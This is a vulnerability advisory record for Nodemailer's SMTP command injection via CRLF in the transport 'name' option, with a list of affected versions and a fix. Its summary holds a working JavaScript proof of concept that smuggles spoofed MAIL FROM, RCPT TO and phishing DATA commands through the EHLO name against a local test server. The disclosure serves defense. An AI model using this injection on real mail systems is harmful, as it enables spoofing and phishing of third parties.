@@ -1,0 +1,449 @@
+advisory_id: GHSA-vvjj-xcjg-gr5g
+datasource_id: github_osv/GHSA-vvjj-xcjg-gr5g
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-vvjj-xcjg-gr5g/GHSA-vvjj-xcjg-gr5g.json
+aliases: []
+summary: |
+  Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO)
+  ### Summary
+
+  Nodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\r\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.
+
+  ### Details
+
+  The vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:
+
+  ```javascript
+  // lib/smtp-connection/index.js, line 71
+  this.name = this.options.name || this._getHostname();
+
+  // line 1336
+  this._sendCommand('EHLO ' + this.name);
+  ```
+
+  The `_sendCommand` method writes the string directly to the socket followed by `\r\n` (line 1082):
+
+  ```javascript
+  this._socket.write(Buffer.from(str + '\r\n', 'utf-8'));
+  ```
+
+  If the `name` option contains `\r\n` sequences, each injected line is interpreted by the SMTP server as a separate command. Unlike the `envelope.from` and `envelope.to` fields which are validated for `\r\n` (line 1107-1119), and unlike `envelope.size` which was recently fixed (GHSA-c7w3-x93f-qmm8) by casting to a number, the `name` parameter receives no CRLF sanitization whatsoever.
+
+  This is distinct from the previously reported GHSA-c7w3-x93f-qmm8 (envelope.size injection) as it affects a different parameter (`name` vs `size`), uses a different injection point (EHLO command vs MAIL FROM command), and occurs at connection initialization rather than during message sending.
+
+  The `name` option is also used in HELO (line 1384) and LHLO (line 1333) commands with the same lack of sanitization.
+
+  ### PoC
+
+  ```javascript
+  const nodemailer = require('nodemailer');
+  const net = require('net');
+
+  // Simple SMTP server to observe injected commands
+  const server = net.createServer(socket => {
+      socket.write('220 test ESMTP\r\n');
+      socket.on('data', data => {
+          const lines = data.toString().split('\r\n').filter(l => l);
+          lines.forEach(line => {
+              console.log('SMTP CMD:', line);
+              if (line.startsWith('EHLO') || line.startsWith('HELO'))
+                  socket.write('250 OK\r\n');
+              else if (line.startsWith('MAIL FROM'))
+                  socket.write('250 OK\r\n');
+              else if (line.startsWith('RCPT TO'))
+                  socket.write('250 OK\r\n');
+              else if (line === 'DATA')
+                  socket.write('354 Go\r\n');
+              else if (line === '.')
+                  socket.write('250 OK\r\n');
+              else if (line === 'QUIT')
+                  { socket.write('221 Bye\r\n'); socket.end(); }
+              else if (line === 'RSET')
+                  socket.write('250 OK\r\n');
+          });
+      });
+  });
+
+  server.listen(0, '127.0.0.1', () => {
+      const port = server.address().port;
+
+      // Inject a complete phishing email via EHLO name
+      const transport = nodemailer.createTransport({
+          host: '127.0.0.1',
+          port: port,
+          secure: false,
+          name: 'legit.host\r\nMAIL FROM:<attacker@evil.com>\r\n'
+              + 'RCPT TO:<victim@target.com>\r\nDATA\r\n'
+              + 'From: ceo@company.com\r\nTo: victim@target.com\r\n'
+              + 'Subject: Urgent\r\n\r\nPhishing content\r\n.\r\nRSET'
+      });
+
+      transport.sendMail({
+          from: 'legit@example.com',
+          to: 'legit-recipient@example.com',
+          subject: 'Normal email',
+          text: 'Normal content'
+      }, () => { server.close(); process.exit(0); });
+  });
+  ```
+
+  Running this PoC shows the SMTP server receives the injected MAIL FROM, RCPT TO, DATA, and phishing email content as separate SMTP commands before the legitimate email is sent.
+
+  ### Impact
+
+  **Who is affected:** Applications that allow users or external input to configure the `name` SMTP transport option. This includes:
+  - Multi-tenant SaaS platforms with per-tenant SMTP configuration
+  - Admin panels where SMTP hostname/name settings are stored in databases
+  - Applications loading SMTP config from environment variables or external sources
+
+  **What can an attacker do:**
+  1. **Send unauthorized emails** to arbitrary recipients by injecting MAIL FROM and RCPT TO commands
+  2. **Spoof email senders** by injecting arbitrary From headers in the DATA portion
+  3. **Conduct phishing attacks** using the legitimate SMTP server as a relay
+  4. **Bypass application-level controls** on email recipients, since the injected commands are processed before the application's intended MAIL FROM/RCPT TO
+  5. **Perform SMTP reconnaissance** by injecting commands like VRFY or EXPN
+
+  The injection occurs at the EHLO stage (before authentication in most SMTP flows), making it particularly dangerous as the injected commands may be processed with the server's trust context.
+
+  **Recommended fix:** Sanitize the `name` option by stripping or rejecting CRLF sequences, similar to how `envelope.from` and `envelope.to` are already validated on lines 1107-1119 of `lib/smtp-connection/index.js`. For example:
+
+  ```javascript
+  this.name = (this.options.name || this._getHostname()).replace(/[\r\n]/g, '');
+  ```
+impacted_packages:
+  - purl: pkg:github/nodemailer/nodemailer
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/nodemailer/nodemailer
+        commit: 0a43876801a420ca528f492eaa01bfc421cc306e
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/nodemailer
+    affected_versions: vers:npm/<=8.0.4
+    fixed_versions: vers:npm/8.0.5
+    affected_packages:
+      - pkg:npm/nodemailer@0.1.1
+      - pkg:npm/nodemailer@0.1.2
+      - pkg:npm/nodemailer@0.1.3
+      - pkg:npm/nodemailer@0.1.4
+      - pkg:npm/nodemailer@0.1.5
+      - pkg:npm/nodemailer@0.1.6
+      - pkg:npm/nodemailer@0.1.7
+      - pkg:npm/nodemailer@0.1.8
+      - pkg:npm/nodemailer@0.1.9
+      - pkg:npm/nodemailer@0.1.10
+      - pkg:npm/nodemailer@0.1.11
+      - pkg:npm/nodemailer@0.1.12
+      - pkg:npm/nodemailer@0.1.13
+      - pkg:npm/nodemailer@0.1.14
+      - pkg:npm/nodemailer@0.1.15
+      - pkg:npm/nodemailer@0.1.16
+      - pkg:npm/nodemailer@0.1.17
+      - pkg:npm/nodemailer@0.1.18
+      - pkg:npm/nodemailer@0.1.19
+      - pkg:npm/nodemailer@0.1.20
+      - pkg:npm/nodemailer@0.1.21
+      - pkg:npm/nodemailer@0.1.22
+      - pkg:npm/nodemailer@0.1.23
+      - pkg:npm/nodemailer@0.1.24
+      - pkg:npm/nodemailer@0.2.0
+      - pkg:npm/nodemailer@0.2.1
+      - pkg:npm/nodemailer@0.2.2
+      - pkg:npm/nodemailer@0.2.3
+      - pkg:npm/nodemailer@0.2.4
+      - pkg:npm/nodemailer@0.3.0
+      - pkg:npm/nodemailer@0.3.1
+      - pkg:npm/nodemailer@0.3.2
+      - pkg:npm/nodemailer@0.3.3
+      - pkg:npm/nodemailer@0.3.4
+      - pkg:npm/nodemailer@0.3.5
+      - pkg:npm/nodemailer@0.3.6
+      - pkg:npm/nodemailer@0.3.7
+      - pkg:npm/nodemailer@0.3.8
+      - pkg:npm/nodemailer@0.3.9
+      - pkg:npm/nodemailer@0.3.10
+      - pkg:npm/nodemailer@0.3.11
+      - pkg:npm/nodemailer@0.3.12
+      - pkg:npm/nodemailer@0.3.13
+      - pkg:npm/nodemailer@0.3.14
+      - pkg:npm/nodemailer@0.3.15
+      - pkg:npm/nodemailer@0.3.16
+      - pkg:npm/nodemailer@0.3.17
+      - pkg:npm/nodemailer@0.3.18
+      - pkg:npm/nodemailer@0.3.19
+      - pkg:npm/nodemailer@0.3.20
+      - pkg:npm/nodemailer@0.3.21
+      - pkg:npm/nodemailer@0.3.22
+      - pkg:npm/nodemailer@0.3.23
+      - pkg:npm/nodemailer@0.3.24
+      - pkg:npm/nodemailer@0.3.25
+      - pkg:npm/nodemailer@0.3.26
+      - pkg:npm/nodemailer@0.3.27
+      - pkg:npm/nodemailer@0.3.28
+      - pkg:npm/nodemailer@0.3.29
+      - pkg:npm/nodemailer@0.3.30
+      - pkg:npm/nodemailer@0.3.31
+      - pkg:npm/nodemailer@0.3.32
+      - pkg:npm/nodemailer@0.3.33
+      - pkg:npm/nodemailer@0.3.34
+      - pkg:npm/nodemailer@0.3.35
+      - pkg:npm/nodemailer@0.3.37
+      - pkg:npm/nodemailer@0.3.38
+      - pkg:npm/nodemailer@0.3.39
+      - pkg:npm/nodemailer@0.3.40
+      - pkg:npm/nodemailer@0.3.41
+      - pkg:npm/nodemailer@0.3.42
+      - pkg:npm/nodemailer@0.3.43
+      - pkg:npm/nodemailer@0.3.44
+      - pkg:npm/nodemailer@0.4.0
+      - pkg:npm/nodemailer@0.4.1
+      - pkg:npm/nodemailer@0.4.2
+      - pkg:npm/nodemailer@0.4.3
+      - pkg:npm/nodemailer@0.4.4
+      - pkg:npm/nodemailer@0.5.0
+      - pkg:npm/nodemailer@0.5.1
+      - pkg:npm/nodemailer@0.5.2
+      - pkg:npm/nodemailer@0.5.3
+      - pkg:npm/nodemailer@0.5.4
+      - pkg:npm/nodemailer@0.5.5
+      - pkg:npm/nodemailer@0.5.6
+      - pkg:npm/nodemailer@0.5.7
+      - pkg:npm/nodemailer@0.5.8
+      - pkg:npm/nodemailer@0.5.9
+      - pkg:npm/nodemailer@0.5.10
+      - pkg:npm/nodemailer@0.5.11
+      - pkg:npm/nodemailer@0.5.12
+      - pkg:npm/nodemailer@0.5.13
+      - pkg:npm/nodemailer@0.5.14
+      - pkg:npm/nodemailer@0.5.15
+      - pkg:npm/nodemailer@0.6.0
+      - pkg:npm/nodemailer@0.6.1
+      - pkg:npm/nodemailer@0.6.2
+      - pkg:npm/nodemailer@0.6.3
+      - pkg:npm/nodemailer@0.6.4
+      - pkg:npm/nodemailer@0.6.5
+      - pkg:npm/nodemailer@0.7.0
+      - pkg:npm/nodemailer@0.7.1
+      - pkg:npm/nodemailer@1.0.0-rc.1
+      - pkg:npm/nodemailer@1.0.0
+      - pkg:npm/nodemailer@1.0.1
+      - pkg:npm/nodemailer@1.0.2
+      - pkg:npm/nodemailer@1.0.3
+      - pkg:npm/nodemailer@1.0.4
+      - pkg:npm/nodemailer@1.1.0
+      - pkg:npm/nodemailer@1.1.1
+      - pkg:npm/nodemailer@1.1.2
+      - pkg:npm/nodemailer@1.2.0
+      - pkg:npm/nodemailer@1.2.1
+      - pkg:npm/nodemailer@1.2.2
+      - pkg:npm/nodemailer@1.3.0
+      - pkg:npm/nodemailer@1.3.1
+      - pkg:npm/nodemailer@1.3.2
+      - pkg:npm/nodemailer@1.3.3
+      - pkg:npm/nodemailer@1.3.4
+      - pkg:npm/nodemailer@1.4.0
+      - pkg:npm/nodemailer@1.5.0
+      - pkg:npm/nodemailer@1.6.0
+      - pkg:npm/nodemailer@1.7.0
+      - pkg:npm/nodemailer@1.8.0
+      - pkg:npm/nodemailer@1.9.0
+      - pkg:npm/nodemailer@1.10.0
+      - pkg:npm/nodemailer@1.11.0
+      - pkg:npm/nodemailer@2.0.0-beta.0
+      - pkg:npm/nodemailer@2.0.0-beta.1
+      - pkg:npm/nodemailer@2.0.0-beta.2
+      - pkg:npm/nodemailer@2.0.0-rc.1
+      - pkg:npm/nodemailer@2.0.0-rc.2
+      - pkg:npm/nodemailer@2.0.0
+      - pkg:npm/nodemailer@2.1.0-beta.0
+      - pkg:npm/nodemailer@2.1.0-beta.1
+      - pkg:npm/nodemailer@2.1.0-beta.2
+      - pkg:npm/nodemailer@2.1.0-beta.3
+      - pkg:npm/nodemailer@2.1.0-rc.0
+      - pkg:npm/nodemailer@2.1.0-rc.1
+      - pkg:npm/nodemailer@2.1.0
+      - pkg:npm/nodemailer@2.2.0-beta.0
+      - pkg:npm/nodemailer@2.2.0-beta.1
+      - pkg:npm/nodemailer@2.2.0-beta.2
+      - pkg:npm/nodemailer@2.2.0-beta.3
+      - pkg:npm/nodemailer@2.2.0-beta.4
+      - pkg:npm/nodemailer@2.2.0-beta.5
+      - pkg:npm/nodemailer@2.2.0-beta.6
+      - pkg:npm/nodemailer@2.2.0-rc.7
+      - pkg:npm/nodemailer@2.2.0-rc.8
+      - pkg:npm/nodemailer@2.2.0-rc.9
+      - pkg:npm/nodemailer@2.2.0-rc.10
+      - pkg:npm/nodemailer@2.2.0-rc.11
+      - pkg:npm/nodemailer@2.2.0
+      - pkg:npm/nodemailer@2.2.1
+      - pkg:npm/nodemailer@2.3.0-beta.0
+      - pkg:npm/nodemailer@2.3.0-beta.1
+      - pkg:npm/nodemailer@2.3.0-rc.2
+      - pkg:npm/nodemailer@2.3.0-rc.3
+      - pkg:npm/nodemailer@2.3.0
+      - pkg:npm/nodemailer@2.3.1-rc.0
+      - pkg:npm/nodemailer@2.3.1
+      - pkg:npm/nodemailer@2.3.2
+      - pkg:npm/nodemailer@2.4.0-beta.0
+      - pkg:npm/nodemailer@2.4.0
+      - pkg:npm/nodemailer@2.4.1
+      - pkg:npm/nodemailer@2.4.2
+      - pkg:npm/nodemailer@2.5.0
+      - pkg:npm/nodemailer@2.6.0
+      - pkg:npm/nodemailer@2.6.1
+      - pkg:npm/nodemailer@2.6.2
+      - pkg:npm/nodemailer@2.6.3
+      - pkg:npm/nodemailer@2.6.4
+      - pkg:npm/nodemailer@2.7.0
+      - pkg:npm/nodemailer@2.7.1
+      - pkg:npm/nodemailer@2.7.2
+      - pkg:npm/nodemailer@3.0.0
+      - pkg:npm/nodemailer@3.0.1
+      - pkg:npm/nodemailer@3.0.2
+      - pkg:npm/nodemailer@3.1.0
+      - pkg:npm/nodemailer@3.1.1
+      - pkg:npm/nodemailer@3.1.2
+      - pkg:npm/nodemailer@3.1.3
+      - pkg:npm/nodemailer@3.1.4
+      - pkg:npm/nodemailer@3.1.5
+      - pkg:npm/nodemailer@3.1.6
+      - pkg:npm/nodemailer@3.1.7
+      - pkg:npm/nodemailer@3.1.8
+      - pkg:npm/nodemailer@4.0.0
+      - pkg:npm/nodemailer@4.0.1
+      - pkg:npm/nodemailer@4.1.0
+      - pkg:npm/nodemailer@4.1.1
+      - pkg:npm/nodemailer@4.1.2
+      - pkg:npm/nodemailer@4.1.3
+      - pkg:npm/nodemailer@4.2.0
+      - pkg:npm/nodemailer@4.3.0
+      - pkg:npm/nodemailer@4.3.1
+      - pkg:npm/nodemailer@4.4.0
+      - pkg:npm/nodemailer@4.4.1
+      - pkg:npm/nodemailer@4.4.2
+      - pkg:npm/nodemailer@4.5.0
+      - pkg:npm/nodemailer@4.6.0
+      - pkg:npm/nodemailer@4.6.1
+      - pkg:npm/nodemailer@4.6.2
+      - pkg:npm/nodemailer@4.6.3
+      - pkg:npm/nodemailer@4.6.4
+      - pkg:npm/nodemailer@4.6.5
+      - pkg:npm/nodemailer@4.6.6
+      - pkg:npm/nodemailer@4.6.7
+      - pkg:npm/nodemailer@4.6.8
+      - pkg:npm/nodemailer@4.7.0
+      - pkg:npm/nodemailer@5.0.0
+      - pkg:npm/nodemailer@5.0.1
+      - pkg:npm/nodemailer@5.1.0
+      - pkg:npm/nodemailer@5.1.1
+      - pkg:npm/nodemailer@6.0.0
+      - pkg:npm/nodemailer@6.1.0
+      - pkg:npm/nodemailer@6.1.1
+      - pkg:npm/nodemailer@6.2.1
+      - pkg:npm/nodemailer@6.3.0
+      - pkg:npm/nodemailer@6.3.1
+      - pkg:npm/nodemailer@6.4.0
+      - pkg:npm/nodemailer@6.4.1
+      - pkg:npm/nodemailer@6.4.2
+      - pkg:npm/nodemailer@6.4.3
+      - pkg:npm/nodemailer@6.4.4
+      - pkg:npm/nodemailer@6.4.5
+      - pkg:npm/nodemailer@6.4.6
+      - pkg:npm/nodemailer@6.4.7
+      - pkg:npm/nodemailer@6.4.8
+      - pkg:npm/nodemailer@6.4.10
+      - pkg:npm/nodemailer@6.4.11
+      - pkg:npm/nodemailer@6.4.12
+      - pkg:npm/nodemailer@6.4.13
+      - pkg:npm/nodemailer@6.4.14
+      - pkg:npm/nodemailer@6.4.15
+      - pkg:npm/nodemailer@6.4.16
+      - pkg:npm/nodemailer@6.4.17
+      - pkg:npm/nodemailer@6.4.18
+      - pkg:npm/nodemailer@6.5.0
+      - pkg:npm/nodemailer@6.6.0
+      - pkg:npm/nodemailer@6.6.1
+      - pkg:npm/nodemailer@6.6.2
+      - pkg:npm/nodemailer@6.6.3
+      - pkg:npm/nodemailer@6.6.4
+      - pkg:npm/nodemailer@6.6.5
+      - pkg:npm/nodemailer@6.7.0
+      - pkg:npm/nodemailer@6.7.1
+      - pkg:npm/nodemailer@6.7.2
+      - pkg:npm/nodemailer@6.7.3
+      - pkg:npm/nodemailer@6.7.4
+      - pkg:npm/nodemailer@6.7.5
+      - pkg:npm/nodemailer@6.7.6
+      - pkg:npm/nodemailer@6.7.7
+      - pkg:npm/nodemailer@6.7.8
+      - pkg:npm/nodemailer@6.8.0
+      - pkg:npm/nodemailer@6.9.0
+      - pkg:npm/nodemailer@6.9.1
+      - pkg:npm/nodemailer@6.9.2
+      - pkg:npm/nodemailer@6.9.3
+      - pkg:npm/nodemailer@6.9.4
+      - pkg:npm/nodemailer@6.9.5
+      - pkg:npm/nodemailer@6.9.6
+      - pkg:npm/nodemailer@6.9.7
+      - pkg:npm/nodemailer@6.9.8
+      - pkg:npm/nodemailer@6.9.9
+      - pkg:npm/nodemailer@6.9.10
+      - pkg:npm/nodemailer@6.9.11
+      - pkg:npm/nodemailer@6.9.12
+      - pkg:npm/nodemailer@6.9.13
+      - pkg:npm/nodemailer@6.9.14
+      - pkg:npm/nodemailer@6.9.15
+      - pkg:npm/nodemailer@6.9.16
+      - pkg:npm/nodemailer@6.10.0
+      - pkg:npm/nodemailer@6.10.1
+      - pkg:npm/nodemailer@7.0.0
+      - pkg:npm/nodemailer@7.0.1
+      - pkg:npm/nodemailer@7.0.2
+      - pkg:npm/nodemailer@7.0.3
+      - pkg:npm/nodemailer@7.0.4
+      - pkg:npm/nodemailer@7.0.5
+      - pkg:npm/nodemailer@7.0.6
+      - pkg:npm/nodemailer@7.0.7
+      - pkg:npm/nodemailer@7.0.9
+      - pkg:npm/nodemailer@7.0.10
+      - pkg:npm/nodemailer@7.0.11
+      - pkg:npm/nodemailer@7.0.12
+      - pkg:npm/nodemailer@7.0.13
+      - pkg:npm/nodemailer@8.0.0
+      - pkg:npm/nodemailer@8.0.1
+      - pkg:npm/nodemailer@8.0.2
+      - pkg:npm/nodemailer@8.0.3
+      - pkg:npm/nodemailer@8.0.4
+    fixed_packages:
+      - pkg:npm/nodemailer@8.0.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '4.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-vvjj-xcjg-gr5g/GHSA-vvjj-xcjg-gr5g.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-93
+references:
+  - url: https://github.com/nodemailer/nodemailer
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g
+    reference_type:
+    reference_id: GHSA-vvjj-xcjg-gr5g
+exploits: []
